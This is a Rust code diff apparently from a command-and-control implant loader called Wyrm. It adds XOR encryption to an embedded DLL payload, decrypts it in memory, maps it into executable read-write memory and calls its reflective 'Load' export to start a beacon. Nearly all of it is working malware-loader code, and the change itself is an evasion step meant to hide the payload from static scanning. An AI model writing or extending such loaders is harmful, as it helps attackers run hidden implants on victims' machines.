@@ -6,42 +6,76 @@ use core::{
 
 use windows_sys::Win32::System::{
     Diagnostics::Debug::{IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER},
-    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc},
+    Memory::{
+        MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAlloc,
+        VirtualFree,
+    },
     SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY},
 };
 
 const DLL_BYTES: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/rdll_encrypted.bin"));
+const ENCRYPTION_KEY: u8 = 0x90;
 
 /// Inject the rDLL into our **current** process
 pub fn inject_current_process() {
+    //
+    // First decrypt the bytes into a vec
+    //
+
     unsafe {
-        let dos = read_unaligned(DLL_BYTES.as_ptr() as *const IMAGE_DOS_HEADER);
-        let nt = read_unaligned(
-            DLL_BYTES.as_ptr().add(dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64
+        //
+        // Allocate memory for the encrypted PE, and decrypt in place
+        //
+        let p_decrypt = VirtualAlloc(
+            null_mut(),
+            DLL_BYTES.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
         );
+        if p_decrypt.is_null() {
+            return;
+        }
+
+        // Copy the bytes into it
+        copy_nonoverlapping(DLL_BYTES.as_ptr(), p_decrypt as _, DLL_BYTES.len());
+
+        // Decrypt the memory
+        for i in 0..DLL_BYTES.len() as usize {
+            let b = (p_decrypt as *mut u8).add(i);
+            *b ^= ENCRYPTION_KEY;
+        }
+
+        //
+        // Now operate on the decrypted PE
+        //
+
+        let dos = read_unaligned(p_decrypt as *const IMAGE_DOS_HEADER);
+        let nt = read_unaligned(p_decrypt.add(dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
 
         // Allocate memory for the Wyrm RDLL
-        let beacon_mem = VirtualAlloc(
+        let p_alloc = VirtualAlloc(
             null_mut(),
             nt.OptionalHeader.SizeOfImage as usize,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE,
         );
 
-        let nt_ptr = DLL_BYTES.as_ptr().add(dos.e_lfanew as usize);
-        write_payload(beacon_mem, DLL_BYTES.as_ptr() as *mut u8, nt_ptr, &nt);
+        let nt_ptr = p_decrypt.add(dos.e_lfanew as usize) as *const u8;
+        write_payload(p_alloc, p_decrypt as *mut u8, nt_ptr, &nt);
 
-        let mapped_nt_ptr =
-            (beacon_mem as usize + dos.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
+        let mapped_nt_ptr = (p_alloc as usize + dos.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
+
+        // Free the decryption scratchpad
+        VirtualFree(p_decrypt, DLL_BYTES.len(), MEM_RELEASE);
 
         //
         // Find the 'Load' export and call the reflective loader (which exists in `Load``)
         //
-        if let Some(load_fn) = find_export_address(beacon_mem, mapped_nt_ptr, "Load") {
+        if let Some(load_fn) = find_export_address(p_alloc, mapped_nt_ptr, "Load") {
             let reflective_load: unsafe extern "system" fn(*mut c_void) -> u32 = transmute(load_fn);
 
             // Call the export and hope for the best! :D
-            reflective_load(beacon_mem);
+            reflective_load(p_alloc);
         }
     }
 }
